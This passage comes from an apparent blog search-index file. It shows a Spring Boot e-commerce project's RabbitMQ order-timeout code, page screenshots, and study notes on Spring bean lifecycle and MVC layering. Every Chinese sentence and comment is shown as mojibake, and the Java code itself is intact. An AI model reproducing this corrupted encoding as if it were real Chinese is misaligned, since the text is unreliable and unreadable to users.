BindingBuilder.bind(evictOrderQueue()).to(deadExchange()).with(EVICT_ORDER_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * JSONçš„æ¶ˆæ¯è½¬æ¢å™¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Jackson2JsonMessageConverter <span class="title function_">messageConverter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›‘å¬MQæ¶ˆæ¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.mq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.OrderService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.MQConstants.QueueConstants.EVICT_ORDER_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderListener</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OrderListener</span><span class="params">(OrderService orderService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.orderService = orderService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç›‘å¬æ¸…ç†è®¢å•çš„æ¶ˆæ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderId è®¢å•id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RabbitListener(queues = EVICT_ORDER_QUEUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenOrderMessage</span><span class="params">(Long orderId)</span> <span class="keyword">throws</span> InterruptedException 	 &#123;</span><br><span class="line">        <span class="keyword">if</span>(orderId != <span class="literal">null</span>)&#123;</span><br><span class="line">            log.info(<span class="string">&quot;æ¥æ”¶åˆ°è®¢å•ä»»åŠ¡ï¼Œè®¢å•idï¼š&#123;&#125;&quot;</span>, orderId);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                orderService.evictOrderIfNecessary(orderId);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¸…ç†è®¢å•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evictOrderIfNecessary</span><span class="params">(Long orderId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æŸ¥è¯¢è®¢å•</span></span><br><span class="line">    <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> getById(orderId);</span><br><span class="line">    <span class="keyword">if</span>(order == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">// è®¢å•ä¸å­˜åœ¨ï¼Œæ— éœ€å¤„ç†</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.åˆ¤æ–­è®¢å•æ˜¯å¦æ”¯ä»˜</span></span><br><span class="line">    <span class="keyword">if</span>(order.getStatus() != OrderStatus.INIT)&#123;</span><br><span class="line">        <span class="comment">// è®¢å•å·²å¤„ç†ï¼Œæ— éœ€é‡å¤å¤„ç†</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.å¦‚æœæœªæ”¯ä»˜ï¼Œéœ€è¦å…³é—­è®¢å•</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">boo</span> <span class="operator">=</span> update().set(<span class="string">&quot;status&quot;</span>, OrderStatus.CLOSED.getValue())</span><br><span class="line">        .set(<span class="string">&quot;close_time&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line">        .eq(<span class="string">&quot;order_id&quot;</span>, orderId)</span><br><span class="line">        <span class="comment">// é€šè¿‡ä¹è§‚é”è¿›ä¸€æ­¥ä¿è¯å¹‚ç­‰æ•ˆæœ</span></span><br><span class="line">        .eq(<span class="string">&quot;status&quot;</span>, OrderStatus.INIT.getValue())</span><br><span class="line">        <span class="comment">// æ‰§è¡Œupdate</span></span><br><span class="line">        .update();</span><br><span class="line">    <span class="keyword">if</span>(!boo)&#123;</span><br><span class="line">        <span class="comment">// æ›´æ–°å¤±è´¥ï¼Œè®¢å•çŠ¶æ€å·²ç»æ”¹å˜ï¼Œæ— éœ€å¤„ç†</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    log.info(<span class="string">&quot;å·²å…³é—­è¶…æ—¶æœªæ”¯ä»˜è®¢å•ï¼š&#123;&#125;&quot;</span>, orderId);</span><br><span class="line">    <span class="comment">// 4.æŸ¥è¯¢OrderDetail</span></span><br><span class="line">    List&lt;OrderDetail&gt; details = detailService.query().eq(<span class="string">&quot;order_id&quot;</span>, orderId).list();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.è·å–å•†å“åŠå•†å“æ•°é‡ä¿¡æ¯</span></span><br><span class="line">    Map&lt;Long, Integer&gt; map = details.stream()</span><br><span class="line">        .collect(Collectors.toMap(OrderDetail::getSkuId, OrderDetail::getNum));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6.æ¢å¤åº“å­˜</span></span><br><span class="line">    itemClient.addStock(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‰å°é—¨æˆ·ä¸»è¦é¡µé¢å±•ç¤º"><a href="#å‰å°é—¨æˆ·ä¸»è¦é¡µé¢å±•ç¤º" class="headerlink" title="å‰å°é—¨æˆ·ä¸»è¦é¡µé¢å±•ç¤º"></a>å‰å°é—¨æˆ·ä¸»è¦é¡µé¢å±•ç¤º</h2><p>ç™»é™†ç•Œé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120509.png" alt="ç™»é™†">æ³¨å†Œç•Œé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120510.png" alt="æ³¨å†Œ"></p>
<p>é¦–é¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120511.png" alt="é¦–é¡µ"></p>
<p>æœç´¢ç»“æœé¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120512.png" alt="æœç´¢ç»“æœé¡µ"></p>
<p>å•†å“è¯¦æƒ…é¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120513.png" alt="å•†å“è¯¦æƒ…é¡µ"></p>
<p>è´­ç‰©è½¦é¡µé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120514.png" alt="è´­ç‰©è½¦"></p>
<p>ç»“ç®—é¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120515.png" alt="ç»“ç®—é¡µ"></p>
<p>å¾®ä¿¡æ”¯ä»˜é¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120516.png" alt="å¾®ä¿¡æ”¯ä»˜é¡µ"></p>
<p>æ”¯ä»˜æˆåŠŸé¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120517.png" alt="æ”¯ä»˜æˆåŠŸé¡µ"></p>
<h2 id="ç®¡ç†å‘˜ä¸»è¦é¡µé¢å±•ç¤º"><a href="#ç®¡ç†å‘˜ä¸»è¦é¡µé¢å±•ç¤º" class="headerlink" title="ç®¡ç†å‘˜ä¸»è¦é¡µé¢å±•ç¤º"></a>ç®¡ç†å‘˜ä¸»è¦é¡µé¢å±•ç¤º</h2><p>ç™»é™†é¡µï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120518.png" alt="ç®¡ç†å‘˜ç™»é™†é¡µ"></p>
<p>è§„æ ¼å‚æ•°ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120519.png" alt="è§„æ ¼å‚æ•°"></p>
<p>å“ç‰Œç®¡ç†ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120520.png" alt="å“ç‰Œç®¡ç†"></p>
<h2 id="åˆ†å¸ƒå¼æ—¥å¿—æœåŠ¡GrayLogé¡µé¢å±•ç¤º"><a href="#åˆ†å¸ƒå¼æ—¥å¿—æœåŠ¡GrayLogé¡µé¢å±•ç¤º" class="headerlink" title="åˆ†å¸ƒå¼æ—¥å¿—æœåŠ¡GrayLogé¡µé¢å±•ç¤º"></a>åˆ†å¸ƒå¼æ—¥å¿—æœåŠ¡GrayLogé¡µé¢å±•ç¤º</h2><p>æ—¥å¿—ç»Ÿè®¡ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120521.png" alt="æˆªå±2021-07-04 ä¸Šåˆ3.57.06 (2)"></p>
<p>DashBoardé¡µé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120522.png" alt="æˆªå±2021-07-04 ä¸Šåˆ4.00.20 (2)"></p>
<p>DashBoardé¡µé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120523.png" alt="image-20210704040232327"></p>
<h2 id="é“¾è·¯è¿½è¸ªSkyWalking"><a href="#é“¾è·¯è¿½è¸ªSkyWalking" class="headerlink" title="é“¾è·¯è¿½è¸ªSkyWalking"></a>é“¾è·¯è¿½è¸ªSkyWalking</h2><p>ä»ªè¡¨ç›˜é¡µé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120524.png" alt="æˆªå±2021-07-04 ä¸Šåˆ3.53.43 (2)"></p>
<p>é“¾è·¯è¿½è¸ªé¡µé¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120525.png" alt="æˆªå±2021-07-04 ä¸Šåˆ3.55.44 (2)"></p>
<p>å¾®æœåŠ¡æ‹“æ‰‘å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120526.png" alt="æˆªå±2021-07-04 ä¸Šåˆ3.55.16 (2)"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>leyou</title>
    <url>/2021/12/21/leyou/leyou/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>Springæä¾›äº†ä¸€ä¸ªé€šç”¨çš„å¼‚å¸¸å¤„ç†å™¨ControllerAdviceï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„å¸®åŠ©æˆ‘ä»¬å®ç°ç»Ÿä¸€çš„å¼‚å¸¸å¤„ç†ã€‚</p>
<h2 id="Beançš„ç”Ÿå‘½å‘¨æœŸ"><a href="#Beançš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Beançš„ç”Ÿå‘½å‘¨æœŸ"></a>Beançš„ç”Ÿå‘½å‘¨æœŸ</h2><p><a href="https://xulinjie.blog.csdn.net/article/details/80086950?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.control&amp;dist_request_id=1331645.20431.16184486089016157&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.control">https://xulinjie.blog.csdn.net/article/details/80086950?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.control&amp;dist_request_id=1331645.20431.16184486089016157&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.control</a></p>
<p>å¯ä»¥ç®€è¿°ä¸ºä»¥ä¸‹ä¹æ­¥<br>å®ä¾‹åŒ–beanå¯¹è±¡(é€šè¿‡æ„é€ æ–¹æ³•æˆ–è€…å·¥å‚æ–¹æ³•)<br>è®¾ç½®å¯¹è±¡å±æ€§(setterç­‰)ï¼ˆä¾èµ–æ³¨å…¥ï¼‰<br>å¦‚æœBeanå®ç°äº†BeanNameAwareæ¥å£ï¼Œå·¥å‚è°ƒç”¨Beançš„setBeanName()æ–¹æ³•ä¼ é€’Beançš„IDã€‚ï¼ˆå’Œä¸‹é¢çš„ä¸€æ¡å‡å±äºæ£€æŸ¥Awareæ¥å£ï¼‰<br>å¦‚æœBeanå®ç°äº†BeanFactoryAwareæ¥å£ï¼Œå·¥å‚è°ƒç”¨setBeanFactory()æ–¹æ³•ä¼ å…¥å·¥å‚è‡ªèº«<br>å°†Beanå®ä¾‹ä¼ é€’ç»™Beançš„å‰ç½®å¤„ç†å™¨çš„postProcessBeforeInitialization(Object bean, String beanname)æ–¹æ³•<br>è°ƒç”¨Beançš„åˆå§‹åŒ–æ–¹æ³•<br>å°†Beanå®ä¾‹ä¼ é€’ç»™Beançš„åç½®å¤„ç†å™¨çš„postProcessAfterInitialization(Object bean, String beanname)æ–¹æ³•<br>ä½¿ç”¨Bean<br>å®¹å™¨å…³é—­ä¹‹å‰ï¼Œè°ƒç”¨Beançš„é”€æ¯æ–¹æ³•</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">&lt;!-- init-methodï¼šæŒ‡å®šåˆå§‹åŒ–çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">        destroy-methodï¼šæŒ‡å®šé”€æ¯çš„æ–¹æ³• --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.linjie.cycle.Student&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;initStudent&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroyStudent&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LINJIE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>beançš„åç½®å¤„ç†å™¨ï¼Œæ˜¯ä¸ºäº†å¯¹beançš„ä¸€ä¸ªå¢å¼º</p>
<p>å¯ä»¥åœ¨applicationContext.xmlä¸­çœ‹åˆ°é…ç½®Beanåç½®å¤„ç†å™¨ï¼Œä¸éœ€è¦IDï¼Œåªéœ€è¦å…¶å…¨ç±»åï¼Œå› ä¸ºIoCå®¹å™¨è‡ªåŠ¨è¯†åˆ«ä¸€ä¸ªBeanPostProcessor</p>
<p>åœ¨æ§åˆ¶å°æ˜¾ç¤ºç»“æœå¯ä»¥çœ‹å‡º,Beançš„åç½®å¤„ç†å™¨å¼ºå¤§ä¹‹å¤„ï¼Œå¯ä»¥å¯¹Beanå®ç°è‡ªå·±æƒ³è¦åšçš„äº‹æƒ…ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œçš„Demoå°±æ˜¯åœ¨postProcessAfterInitializationæ–¹æ³•ä¸­å°†æˆå‘˜å˜é‡nameå·å·ä¿®æ”¹äº†ï¼Œæœ€åè¾“å‡ºçš„å°±æ˜¯å·å·ä¿®æ”¹ä¹‹åçš„å€¼</p>
</blockquote>
<h2 id="springboot2"><a href="#springboot2" class="headerlink" title="springboot2"></a>springboot2</h2><p>é€‚é…å™¨æŠŠæ¥å£å…¨éƒ¨å®ç°ä¸€é,ç„¶åç»§æ‰¿é€‚é…å™¨,é‡å†™æ–¹æ³•,java8æ–°ç‰¹æ€§æœ‰æ¥å£é»˜è®¤å®ç°,å°±å¯ä»¥ä¸éœ€è¦é€‚é…å™¨äº†</p>
<p>å°±æŒ‰MVCæ¨¡å¼çš„å¼€å‘æ¨¡å¼æ¥ï¼Œæˆ‘ä»¬é¡¹ç›®ä¸­åŒ…å«çš„ç»“æ„å±‚åˆ†åˆ«æ˜¯viewï¼Œcontrollerï¼Œserviceï¼Œdaoã€‚</p>
<p>ä¸‹é¢ä»‹ç»ä¸€ä¸‹å„å±‚çš„æ„ä¹‰å’Œé¡¹ç›®è¿è¡Œæµç¨‹ï¼š</p>
<p>viewæ˜¯å‰å°é¡µé¢ï¼Œç”¨æˆ·å‘é€è¯·æ±‚æ—¶ä»å‰ç«¯çš„é¡µé¢å¼€å§‹çš„ï¼Œå‰ç«¯getåˆ°è¿™ä¸ªè¯·æ±‚åä¼šæŠŠè¯·æ±‚å’Œé¡ºå¸¦å‚æ•°ä¿¡æ¯ä¼ é€åˆ°åå°ï¼Œåå°æ¥å—è¿™ä¸ªè¯·æ±‚æ‰¾åˆ°å¯¹åº”çš„æ¥å£å»æ‰§è¡Œå¯¹åº”çš„controlleré‡Œçš„å¯¹åº”çš„æ–¹æ³•ï¼Œç„¶åæ‰§è¡Œï¼Œç„¶åcontrollerä¼šè°ƒç”¨serviceå±‚çš„ä¸šåŠ¡é€»è¾‘ï¼Œserviceæœ‰ä¼šå»è®¿é—®daoå±‚æ¥è¿æ¥æ•°æ®åº“ã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»¬åç«¯ç¨‹åºå‘˜éƒ½ç†Ÿæ‚‰çš„å¼€å‘æ¨¡å¼ï¼Œç„¶è€Œä¸è®ºæ˜¯åˆšå¼€å§‹ä»äº‹ç¨‹åºå¼€å‘çš„ç¨‹åºå‘˜è¿˜æ˜¯æœ‰ä¸€å®šå¼€å‘ç»éªŒçš„ç¨‹åºå‘˜ï¼Œæœ‰æ—¶å€™å…¶å®éƒ½ç‰¹åˆ«æå¾—æ¸…æ¥šcontrollerå±‚å’Œserviceå±‚ä¹‹é—´çš„å…³ç³»ï¼Œä¼šæŠŠä»–ä»¬çš„åŠŸèƒ½ææ¨¡ç³Šï¼Œæˆ–è€…è¯´æ˜¯ä½ è™½ç„¶æ˜ç¡®çš„çŸ¥é“ä»–ä»¬ä¸¤ä¸ªçš„å„è‡ªåˆ†å·¥ï¼Œä½†æ˜¯åœ¨å®é™…æ‰“å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå°±æ˜¯ä¼šæŠŠä¸€äº›ä»£ç å†™æ‚äº†ï¼Œè¯¥å†™åœ¨serviceé‡Œçš„ä»£ç æ®µå†™åˆ°controlleré‡Œå»äº†ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸ºäº†è§„èŒƒï¼Œæœ‰å¿…è¦ææ¸…æ¥šcontrollerä¸­åˆ°åº•æ˜¯å†™ä»€ä¹ˆä¸œè¥¿æ¥ç€ï¼Œ</p>
<p>1ã€è¿™é‡Œåªæ¥æ”¶æ•°æ®ï¼Œç„¶åæ ¡éªŒæ•°æ®ï¼Œæ ¡éªŒåˆæ³•æ€§å’Œå‡†ç¡®æ€§ï¼Œæ¯”å¦‚è¯´ç™»å½•çš„controllerï¼Œæ¥æ”¶åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼Œä½ è¦åˆ¤æ–­é•¿åº¦æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œå¯†ç è§£å¯†å‡ºæ¥ã€‚</p>
<p>2ã€æœ‰çš„å¿…è¦çš„æƒ…å†µï¼Œåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ŒæŠŠæ•°æ®è¡¥å…¨ï¼Œæ¯”å¦‚ä»–çš„ä¸€äº›ç®€å•çš„å±æ€§ï¼Œåˆ›å»ºæ—¶é—´å•Šä¿®æ”¹æ—¶é—´å•Šï¼Œè¿˜æœ‰åˆå§‹å€¼ä»€ä¹ˆçš„ã€‚</p>
<p>3ã€å…¶ä»–çš„éƒ½ä¸è¦å†™åœ¨controlleré‡Œï¼Œå…¶ä»–çš„å¤æ‚ä¸šåŠ¡é€»è¾‘åˆ¤æ–­ä»€ä¹ˆçš„ï¼Œéƒ½æ”¾åœ¨serviceé‡Œå¤´å»ã€‚</p>
<p><strong>1.Daoå±‚</strong>ï¼šå…¨ç§°Data Access Objectã€‚Daoå±‚æ¯”è¾ƒåº•å±‚ï¼Œè´Ÿè´£ä¸æ•°æ®åº“æ‰“äº¤é“å…·ä½“åˆ°å¯¹æŸä¸ªè¡¨ã€æŸä¸ªå®ä½“çš„å¢åˆ æ”¹æŸ¥<br><strong>2.Serviceå±‚</strong>ï¼šåˆå«æœåŠ¡å±‚æˆ–ä¸šåŠ¡å±‚ï¼Œå°è£…Daoå±‚çš„æ“ä½œï¼Œä½¿ä¸€ä¸ªæ–¹æ³•å¯¹å¤–è¡¨ç°ä¸ºå®ç°ä¸€ç§åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šç½‘è´­ç”Ÿæˆè®¢å•æ—¶ï¼Œä¸ä»…è¦æ’å…¥è®¢å•ä¿¡æ¯è®°å½•ï¼Œè¿˜è¦æŸ¥è¯¢å•†å“åº“å­˜æ˜¯å¦å……è¶³ï¼Œè´­ä¹°æ˜¯å¦è¶…è¿‡é™åˆ¶ç­‰ç­‰ã€‚<br><strong>3.Controllerå±‚</strong>ï¼šä¸šåŠ¡æ§åˆ¶å±‚ï¼Œè´Ÿè´£æ¥æ”¶æ•°æ®å’Œè¯·æ±‚ï¼Œå¹¶ä¸”è°ƒç”¨Serviceå±‚å®ç°è¿™ä¸ªä¸šåŠ¡é€»è¾‘ã€‚</p>
<p><strong>Controllerå±‚</strong>åƒæ˜¯ä¸€ä¸ª<strong>æœåŠ¡å‘˜</strong>ï¼Œä»–æŠŠå®¢äººï¼ˆå‰ç«¯ï¼‰ç‚¹çš„èœï¼ˆæ•°æ®ã€è¯·æ±‚çš„ç±»å‹ç­‰ï¼‰è¿›è¡Œæ±‡æ€»ä»€ä¹ˆå£å‘³ã€å’¸æ·¡ã€é‡çš„å¤šå°‘ï¼Œäº¤ç»™<strong>å¨å¸ˆé•¿</strong>ï¼ˆServiceå±‚ï¼‰ï¼Œå¨å¸ˆé•¿åˆ™å‘Šè¯‰æ²¾æ¿å¨å¸ˆï¼ˆDao 1ï¼‰ã€æ±¤æ–™æˆ¿ï¼ˆDao 2ï¼‰ã€é…èœå¨å¸ˆï¼ˆDao 3ï¼‰ç­‰ï¼ˆç»Ÿç§°Daoå±‚ï¼‰æˆ‘éœ€è¦ä»€ä¹ˆæ ·çš„åŠæˆå“ï¼Œ<strong>å‰¯å¨ä»¬</strong>ï¼ˆDaoå±‚ï¼‰å°±è´Ÿè´£å®Œæˆ<strong>å¨å¸ˆé•¿</strong>ï¼ˆServiceï¼‰äº¤ä»£çš„ä»»åŠ¡ã€‚ä¸çŸ¥é“è¿™ä¸ªæ¯”å–»æ˜¯å¦åˆé€‚ã€‚</p>
<p>@restcontoller</p>
<p>ResponseBody ç›´æ¥è¿”å›,ä¸å»æ‰¾é¡µé¢,ç›¸å½“äºæœåŠ¡å‘˜ç›´æ¥å¸®ä½ æ‹¿ä¸ªçº¸å·¾. é™æ€èµ„æº(ç»ç†)å°±æ˜¯æ™®é€šcontrollerä¸èƒ½å¤„ç†,å¾—è‡ªå·±å»å¤„ç†,ç»ç†å†å¤„ç†ä¸äº†å°±è¿”å›404</p>
<p>çˆ¶é¡¹ç›®ä½œä¾èµ–ç®¡ç†</p>
<p>@component ï¼ˆæŠŠæ™®é€špojoå®ä¾‹åŒ–åˆ°springå®¹å™¨ä¸­ï¼Œç›¸å½“äºé…ç½®æ–‡ä»¶ä¸­çš„<br><bean id="" class=""/>ï¼‰</p>
<p>æ³›æŒ‡å„ç§ç»„ä»¶ï¼Œå°±æ˜¯è¯´å½“æˆ‘ä»¬çš„ç±»ä¸å±äºå„ç§å½’ç±»çš„æ—¶å€™ï¼ˆä¸å±äº@Controllerã€@Servicesç­‰çš„æ—¶å€™ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨@Componentæ¥æ ‡æ³¨è¿™ä¸ªç±»ã€‚</p>
<blockquote>
<p>proxyBeanMethodså±æ€§é»˜è®¤å€¼æ˜¯true,ä¹Ÿå°±æ˜¯è¯´è¯¥é…ç½®ç±»ä¼šè¢«ä»£ç†ï¼ˆCGLIBï¼‰ï¼Œåœ¨åŒä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­è°ƒç”¨å…¶å®ƒè¢«@Beanæ³¨è§£æ ‡æ³¨çš„æ–¹æ³•è·å–å¯¹è±¡æ—¶ä¼šç›´æ¥ä»IOCå®¹å™¨ä¹‹ä¸­è·å–ï¼›</p>
</blockquote>
<p>æ³¨è§£çš„æ„æ€æ˜¯proxyBeanMethodsé…ç½®ç±»æ˜¯ç”¨æ¥æŒ‡å®š@Beanæ³¨è§£æ ‡æ³¨çš„æ–¹æ³•æ˜¯å¦ä½¿ç”¨ä»£ç†ï¼Œé»˜è®¤æ˜¯trueä½¿ç”¨ä»£ç†ï¼Œç›´æ¥ä»IOCå®¹å™¨ä¹‹ä¸­å–å¾—å¯¹è±¡ï¼›å¦‚æœè®¾ç½®ä¸ºfalse,ä¹Ÿå°±æ˜¯ä¸ä½¿ç”¨æ³¨è§£ï¼Œæ¯æ¬¡è°ƒç”¨@Beanæ ‡æ³¨çš„æ–¹æ³•è·å–åˆ°çš„å¯¹è±¡å’ŒIOCå®¹å™¨ä¸­çš„éƒ½ä¸ä¸€æ ·ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æ­¤å±æ€§è®¾ç½®ä¸ºfalseæ¥æé«˜æ€§èƒ½ï¼›</p>
<p>å…¶å®æ˜¯ä¸ºäº†å¯åŠ¨å˜å¾—æ›´å¿«ï¼Œfalseçš„æ—¶å€™ä¸è¿›å®¹å™¨ï¼Œtrueçš„æ—¶å€™è¿›å®¹å™¨ã€‚è¿›å®¹å™¨å‰è¿˜éœ€è¦ç»è¿‡ä¸€å±‚ä»£ç†ï¼Œå¯¼è‡´å¯åŠ¨æ¯”falseçš„æ—¶å€™æ…¢äº†ã€‚</p>
<p>thymeleafä¸é€‚åˆé«˜å¹¶å‘</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022649.png" alt="img"></p>
<h2 id="Springä¸­-Componentçš„ä½œç”¨"><a href="#Springä¸­-Componentçš„ä½œç”¨" class="headerlink" title="Springä¸­@Componentçš„ä½œç”¨"></a>Springä¸­@Componentçš„ä½œç”¨</h2><p>1ã€@controller æ§åˆ¶å™¨ï¼ˆæ³¨å…¥æœåŠ¡ï¼‰</p>
<ul>
<li>ç”¨äºæ ‡æ³¨æ§åˆ¶å±‚ï¼Œç›¸å½“äºstrutsä¸­çš„actionå±‚</li>
</ul>
<p>2ã€@service æœåŠ¡ï¼ˆæ³¨å…¥daoï¼‰</p>
<ul>
<li>ç”¨äºæ ‡æ³¨æœåŠ¡å±‚ï¼Œä¸»è¦ç”¨æ¥è¿›è¡Œä¸šåŠ¡çš„é€»è¾‘å¤„ç†</li>
</ul>
<p>3ã€@repositoryï¼ˆå®ç°daoè®¿é—®ï¼‰</p>
<ul>
<li>ç”¨äºæ ‡æ³¨æ•°æ®è®¿é—®å±‚ï¼Œä¹Ÿå¯ä»¥è¯´ç”¨äºæ ‡æ³¨æ•°æ®è®¿é—®ç»„ä»¶ï¼Œå³DAOç»„ä»¶.</li>
</ul>
